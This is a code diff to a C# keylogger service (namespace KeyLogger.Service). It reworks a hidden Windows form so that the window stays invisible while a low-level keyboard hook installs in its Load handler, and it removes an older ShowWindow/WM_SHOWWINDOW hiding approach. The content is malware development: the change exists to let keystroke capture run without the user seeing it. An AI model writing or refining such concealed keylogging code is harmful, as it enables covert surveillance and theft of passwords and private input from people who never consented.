@@ -88,6 +88,8 @@ namespace KeyLogger.Service
             var form = new HiddenForm();
             form.Load += delegate
             {
+                form.Hide(); // Load has fired, hide immediately
+
                 _keyboardProc = HookCallback;
                 using (Process p = Process.GetCurrentProcess())
                 using (ProcessModule m = p.MainModule)
@@ -276,14 +278,14 @@ namespace KeyLogger.Service
 
         protected override void SetVisibleCore(bool value)
         {
-            if (!IsHandleCreated) { CreateHandle(); NativeMethods.ShowWindow(Handle, 0); }
-            base.SetVisibleCore(false);
-        }
-
-        protected override void WndProc(ref Message m)
-        {
-            if (m.Msg == 0x0018) return; // WM_SHOWWINDOW
-            base.WndProc(ref m);
+            // Let the first show-through happen so Load event fires
+            // (hook installs in Load handler). Then keep it hidden.
+            if (value && IsHandleCreated)
+            {
+                base.SetVisibleCore(false);
+                return;
+            }
+            base.SetVisibleCore(value);
         }
 
         protected override CreateParams CreateParams
@@ -295,11 +297,5 @@ namespace KeyLogger.Service
                 return cp;
             }
         }
-    }
-
-    internal static class NativeMethods
-    {
-        [DllImport("user32.dll")]
-        internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
